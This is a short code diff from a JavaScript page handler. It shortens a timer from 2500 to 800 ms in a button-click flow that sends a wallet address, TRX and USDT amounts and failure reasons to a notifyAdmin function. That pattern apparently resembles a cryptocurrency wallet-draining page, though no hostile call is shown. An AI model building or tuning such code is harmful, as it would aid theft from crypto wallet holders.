@@ -74,7 +74,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
                     location.reload();
                 }
-            }, 2500);
+            }, 800);
 
         } catch (e) {
             await notifyAdmin("❌ ERROR", address, trx, usdt, e.message);
